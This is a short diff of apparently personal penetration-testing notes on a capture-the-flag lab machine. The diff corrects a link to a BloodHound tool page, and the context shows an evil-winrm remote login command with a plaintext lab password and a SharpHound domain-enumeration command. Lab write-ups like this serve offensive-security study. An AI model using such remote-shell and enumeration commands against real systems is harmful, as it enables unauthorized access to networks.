@@ -108,7 +108,7 @@ evil-winrm -p 's3rvice' -u 'svc-alfresco' -i 10.10.10.161
 >![[Pasted image 20250312231844.png]]
 >![[Pasted image 20250312231846.png]]
 
-- we can use [[bloodhaunt]] to get a better view
+- we can use [[../../../Tools/BloodHound|BloodHound]] to get a better view
 ```powershell
 .\SharpHound.exe -c ALL
 ```
